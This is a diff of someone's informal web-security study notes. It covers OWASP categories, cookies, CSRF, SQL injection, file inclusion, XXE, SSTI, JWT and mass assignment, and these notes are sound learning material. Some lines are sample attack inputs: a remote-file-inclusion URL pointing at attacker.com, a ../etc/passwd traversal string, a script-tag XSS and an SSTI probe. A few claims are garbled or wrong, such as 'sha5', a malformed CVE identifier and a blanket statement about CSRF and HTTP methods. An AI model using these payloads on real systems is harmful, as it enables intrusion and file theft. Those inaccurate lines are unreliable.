@@ -1,3 +1,18 @@
+CIA - Confidentiality Integrity and Availability  
+OWASP - open webapp security project  
+SDLC -- Secure development lifecycle -- requirement analysis, planning, design, development, testing, deployment, maintenance   
+common SDLC models -- waterfall, agile, devops - cyclical continous(CI/CD continous integration and conti development)    
+xss vs sqli --- client side vs server side  
+Symmetric vs asymmetric --- same key for enc/dev and pub/priv key for enc dec  -- AES/DES  -- RSA/DSA    
+session hijacking -- using stoken cookies  
+input validation - is data acceptable - age number not string, sanitization:  make data safe to use encoding  
+hashing algorithms -- bcrypt - for password hsahing, sha2, sha5 for signatures, and not use md5, sha1   
+privilege escalation -- vertical vs horizontal  vs idor ? no escalation in idor just the unathorized data access  
+CVE - common vulnera enumeration -- an identifier assigned to vulnerabilities CVE-2025-react2shell  
+vuln vs threat vs risk: vuln is weakness/flaw, threat potential event that can harm - cyber attack, Risk is probability of threat exploiting vuln   
+
+ 
+
 ## OWASP Top 10  
 Identification and Authentication failures - missing mfa, weak pass  
 Broken access control - idor  
@@ -26,6 +41,8 @@ strict-origin-when-cross-origin: full url to same-origin, just origin https://so
 say text/plain and if the response content is js, it should not be processed and execute js. Instead just render it as stated in the content-type.  
 
 **CSP**: can prevent both  xss, click-jacks.  for inline scripts to allow use nonce! -- use csp evaluator  
+cannot fully prevent xss but can limit the impact when inline script is blocked  
+html defacement still valid, if js files are compromised then no  and can;t prevent DOM based xss  
 
 **SOP**: hostaname port and protocol should match to be considered same origin,  
 Same origin policy – default security mechanim in moden web browsers,  
@@ -55,13 +72,15 @@ PATH: default is the path of resource that set the cookie, otherwise can be /adm
 samesite: none: allows cross-site but only over https, Lax: allows cross-site get only. Strict: no cross-site allowed – meaning cookie won't be sent in cross site requests.  
 On modern browsers default is Lax 
 
-## CSRF:  
+## CSRF:  action+authentication session  
 attack within logged in users session, eg: bank trasfer url sendto=soda&amount=1000, if sending this to victim works.  
 Check for csrf tokens – unique tokens per page request !  
-csrf cookies are common to be referenced in js, as it prevents client-side scripts from reading the cookie hence no http-only attribute necessary.  
+csrf cookies are common to be referenced in js, as it prevents client-side scripts from reading the cookie hence no http-only attribute necessary.    
 Same-site=lax/strict prevents csrf – because cookie won't be sent in strict, in lax only get requests supported. As long as no action in GET – it is suffice  
 strict -- sends cookies when user is directly navigating within the same site - not sent when requess comes from other site, form from other domain  
 Threrefore If site is vulnerable to XSS – then csrf from within same site will be possible with both strict and csrf protection !  
+CSRF not possible with methods like delete, patch, put etc.. just post and get  
+preflight request: sent for non simple content types, non simple headers, , to check whether server accepts cross orign requests -  by the browser  
 
 ## Session Fixation:  
 session identifier doesn’t change after successful login. Ex: cookie value.  
@@ -75,7 +94,46 @@ potentially leading to attacks like Cross-Site Scripting (XSS), data retrieval, 
 Client side: eg: xss:   https://example.com/search?q=shoes&q=<script>alert('hacked')  
 Server side: eg:https://test.com?discount=10&discount=50  //server might use second instead of first or add both and give 60% discount.  
 
-## Prototype Pollution:  
+## SQL Injection  
+user input placed in backend sql queries without sanitization..  
+input validation and pameterized queries  -- db treats the input as data not code  
+ 
+in-band - errors/results to user eg: auth bypass,union,  
+blind - no output but behaviour changes - time based, boolean based  
+out-of-band - external comm very rare  
+
+**File Inclusion**  
+referenced file gets loaded and executed - even if the log file contains php code it gets executed - so rce via log poisoning  
+local file inclusion and remote file inclusion  https://test.com?page=http://attacker.com/malicious.php  
+path traversal - access files outside intended directory --- ../../../../etc/passwd  
+
+## Broken Access Control  
+can be horizontal or vertical  
+## Insecure Direct Object Reference-IDOR  
+accesscontrol vuln allowing attackers to access/update/delete data by referencing an internal objects such as user id, file id, order num etc  
+
+## JWT testing  
+no hash validation, none, HS256, crack hash, dir traversal with kid, sign with public key,  
+
+## XXE  
+xml like json is to transport and store data, xxe external xml entity a variable defined with some value, which the parser processes and places in placeholder  
+dangerous because can refer external files primarily /etc/passwd  can also lead to rce depending on other supported features  
+how to store < its xml tag, using entity &lt; predefined..  
+
+## Server side template injection(SSTI)  
+user controller input gets procesed by template engine without validation as template code  
+{{7*7}}  
+
+API specific:  
+## BOLA(broken object level authorization)  
+API security verion of IDOR, same as IDOR fetch or update objects we shouldn’t be allowed to.  
+
+## Mass assignment:  
+in an api  If the application blindly binds all provided fields to the object without an allowlist or proper validation,  
+the attacker can successfully elevate their privileges eg:say updating user /profile?user=1 –  
+adding admin=true – unknown parameter just guessing it, might make the user admin !!  
+
+ ## Prototype Pollution:  
 javascript specific vulnerability - DOM invader -  
 to prevent: Filter out __proto__, constructor, and prototype keys from user input before merging  
 if user controlled input is used in js object modification then attacker can add __prototype__ property to the object which gets inherited by all objects.  
@@ -95,29 +153,6 @@ java php  data is base64 encoded
 try modifying serialized objects isAdmin:1 make sure to update string length   
 access_token=0 or password=0  //auth byass on older php due to string defualt is 0 in == operation  
 magic methods that are automatically available during derserailiztion  
-
-
-## SQL Injection  
-user input placed in backend sql queries without sanitization..  
-input validation and pameterized queries  -- db treats the input as data not code  
- 
-in-band - errors/results to user eg: auth bypass,union,  
-blind - no output but behaviour changes - time based, boolean based  
-out-of-band - external comm very rare  
-
-## Insecure Direct Object Reference-IDOR  
-accesscontrol vuln allowing attackers to access/update/delete data by referencing an internal objects such as user id, file id, order num etc  
-
-API specific:  
-## BOLA(broken object level authorization)  
-API security verion of IDOR, same as IDOR fetch or update objects we shouldn’t be allowed to.  
-
-## Mass assignment:  
-in an api  If the application blindly binds all provided fields to the object without an allowlist or proper validation,  
-the attacker can successfully elevate their privileges eg:say updating user /profile?user=1 –  
-adding admin=true – unknown parameter just guessing it, might make the user admin !!  
-
- 
 
  
 
